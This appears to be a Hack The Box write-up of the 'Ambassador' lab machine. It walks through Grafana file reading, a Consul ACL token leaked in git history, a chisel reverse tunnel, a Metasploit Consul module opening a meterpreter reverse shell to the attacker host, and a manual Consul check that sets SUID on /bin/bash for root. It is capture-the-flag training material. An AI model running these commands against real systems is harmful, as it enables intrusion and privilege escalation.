### Tools: feroxbuster, sqlitebrowser, sqldump, git, Consul
### Vulnerabilities: Grafana LFI, MySQL creds, Consul ACL token

Nmap shows us the way with ports 22, 80, and 3000 open.
Run a quick feroxbuster before we visit the site, but we did not find anything helpful.
Note: I noticed in burpsuite that there was also a redirect field that seems interesting but I never ended up doing anything with it.

Instead there was a simple exlpoit for grafana that allowed you to read files. Which is really just an LFI. TO make sure it is vulnerable we can confirm the version of this grafana by looking at the bottom of the login screen. This shows that our version is 8.2.
By looking in grafan.ini we find the following creds.
grafana
The full creds decoded.
From pspy it shows root is running consul. I Had never dealt with consul but I had a good feeling about it so this was the first thing I checked into.
```console

Linpeas also tells us that there are a couple of other services running on open ports.

```console
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -  
```

By using curl we can confirm that consul is being ran on port 8500.

```console
developer@ambassador:/tmp$ curl http://127.0.0.1:8500
Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.
```
As developer we can run consul and check the version so we can find an exploit.


```console
developer@ambassador:/tmp$ consul --version
Consul v1.13.2
Revision 0e046bbb
Build Date 2022-09-20T20:30:07Z
Protocol 2 spoken by default, understands 2 to 3 (agent will automatically use protocol >2 when speaking to compatible agents)
```

Linpeas also tells us that there is a .git file. From doing other Machines on HTB everytime there has been a .git I have found good info in the directory to use.

So lets transfer the files from the victim to our host computer and see what we can find.

```
/opt/my-app/.git
```

We have a couple of files we can check out.

```console
└──╼ [★]$ git ls-files --stage
100644 681ceb58607bb4d9e8fc96951ef7cd44e1f7f2cc 0	.gitignore
100755 d2c40f436012196a0a36a6467e9a67efc9c9dd74 0	whackywidget/manage.py
100755 fc51ec049c05010b9b24d9128ef29355f1b33510 0	whackywidget/put-config-in-consul.sh
100644 e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 0	whackywidget/whackywidget/__init__.py
100644 bf8abe030726e72b0486e321b486da80fccc46d3 0	whackywidget/whackywidget/asgi.py
100644 79406a8e4d6229e1950f76e5147e0feacf452f8e 0	whackywidget/whackywidget/settings.py
100644 d573d56be33180e77e60c3eee941999acf7f1bd9 0	whackywidget/whackywidget/urls.py
100644 4a1f6dc2de28483ff9e518514db9b940967f305b 0	whackywidget/whackywidget/wsgi.py
```

Git log shows some changes took place.

```console
└──╼ [★]$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
(END)

```

If we check out the commit with config script it reveals a command used with consul and a token!

With this token we can finally do our exploit.

```console
└──╼ [★]$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
new file mode 100755
index 0000000..35c08f6
--- /dev/null
+++ b/whackywidget/put-config-in-consul.sh
@@ -0,0 +1,4 @@
+# We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD before running
+
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

I thought it was interesting that there was a secret key found in this one but I did not find anything to do with it so it was likely a rabbit hole.

```console
└──╼ [★]$ git show 79406a8e4d6229e1950f76e5147e0feacf452f8e
"""
Django settings for whackywidget project.

Generated by 'django-admin startproject' using Django 4.0.3.

For more information on this file, see
https://docs.djangoproject.com/en/4.0/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/4.0/ref/settings/
"""

from pathlib import Path

# Build paths inside the project like this: BASE_DIR / 'subdir'.
BASE_DIR = Path(__file__).resolve().parent.parent


# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/4.0/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = 'django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l'

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True
```

To solve this with metasploit we can use the ACL token we found earlier in the .git files and configure the options.

1st lets set up a chisel server so we can forward our data from the host computer to the chisel server, to the local host. AKA pivoting.

Transfer chisel to the victim computer and set it up. (Link below to chisel download)

https://github.com/jpillora/chisel/releases

```console
└─$ chisel server --reverse --port 1235
2022/10/05 11:41:25 server: Reverse tunnelling enabled
2022/10/05 11:41:25 server: Fingerprint uJMyaBsdcjYGgXGDlPhOS2iV5RpiTU7tJ5IjmXTUEL0=
2022/10/05 11:41:25 server: Listening on http://0.0.0.0:1235
2022/10/05 11:42:45 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/10/05 11:42:45 server: session#1: tun: proxy#R:8500=>8500: Listening
```
```console
developer@ambassador:/tmp$ ./chisel2 client 10.10.16.24:1235 R:8500:127.0.0.1:8500
2022/10/05 16:42:30 client: Connecting to ws://10.10.16.24:1235
2022/10/05 16:42:31 client: Connected (Latency 30.262281ms)
```
Set up our options for the exploit.

Note: I originally tried installing a more recent module of this exploit but it did not work.

```console
[msf](Jobs:0 Agents:0) exploit(multi/misc/consul_service_exec) >> options

Module options (exploit/multi/misc/consul_service_exec):

   Name       Current Setting    Required  Description
   ----       ---------------    --------  -----------
   ACL_TOKEN  bb03b43b-1d81-d62  no        Consul Agent ACL token
              b-24b5-39540ee469
              b5
   Proxies                       no        A proxy chain of format typ
                                           e:host:port[,type:host:port
                                           ][...]
   RHOSTS     127.0.0.1          yes       The target host(s), see htt
                                           ps://github.com/rapid7/meta
                                           sploit-framework/wiki/Using
                                           -Metasploit
   RPORT      8500               yes       The target port (TCP)
   SRVHOST    0.0.0.0            yes       The local host or network i
                                           nterface to listen on. This
                                            must be an address on the
                                           local machine or 0.0.0.0 to
                                            listen on all addresses.
   SRVPORT    8080               yes       The local port to listen on
                                           .
   SSL        false              no        Negotiate SSL/TLS for outgo
                                           ing connections
   SSLCert                       no        Path to a custom SSL certif
                                           icate (default is randomly
                                           generated)
   TARGETURI  /                  yes       The base path
   URIPATH                       no        The URI to use for this exp
                                           loit (default is random)
   VHOST                         no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.63      yes       The listen address (an interface
                                     may be specified)
   LPORT  1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux


[msf](Jobs:0 Agents:0) exploit(multi/misc/consul_service_exec) >> run

[*] Started reverse TCP handler on 10.10.14.63:1234 
[*] Creating service 'CkgOb'
[*] Service 'CkgOb' successfully created.
[*] Waiting for service 'CkgOb' script to trigger
[*] Sending stage (989032 bytes) to 10.129.52.79
[*] Meterpreter session 1 opened (10.10.14.63:1234 -> 10.129.52.79:47984) at 2022-10-04 20:15:48 +0100
[*] Removing service 'CkgOb'
[*] Command Stager progress - 100.00% done (763/763 bytes)
```
BOOM! Metasploit is an easy way to go but for the sake of learning and training for OSCP I try to refrain from using it.

```console
(Meterpreter 1)(/) > cat /root/root.txt
18bf****************************

```

Thats why we have a manual version to learn from!

For the manual version the link below gives info and scripts to make the exploit happen.

https://www.consul.io/docs/discovery/checks

Note: It is possible to exploit this through curl but I was unable to make it work.

Edit the script slightly to chmod bash to have a suid bit.

```hcl
check = {
  id = "rogue"
  name = "rogue"
  args = ["/usr/bin/chmod","4777","/bin/bash"]
  interval = "10s"
  timeout = "1s"
}
```

Upload the file to the victim and copy the file into the consul config.

```console
developer@ambassador:~$ wget http://10.10.14.63:8000/exploit.hcl
developer@ambassador:~$ cp exploit.hcl /etc/consul.d/config.d/
```
Next we are going to run the commands directly with consul and use the token found earlier in the .git files.

Note: Consul documentation will help you out the most for learning how to use this program.

```console
developer@ambassador:~$ consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
developer@ambassador:~$ consul services register -token=bb03b43b-1d81-d62b-24b5-39540ee469b5 /etc/consul.d/config.d/exploit.hcl
developer@ambassador:~$ consul reload -token=bb03b43b-1d81-d62b-24b5-39540ee469b5
Configuration reload triggered
```

After running these commands /bin/bash should have the suid bit set and you can run commands as root!

```console
developer@ambassador:~$ bash -p
bash-5.0# id
uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer)
bash-5.0# cat /root/root.txt
a693****************************
bash-5.0# 
```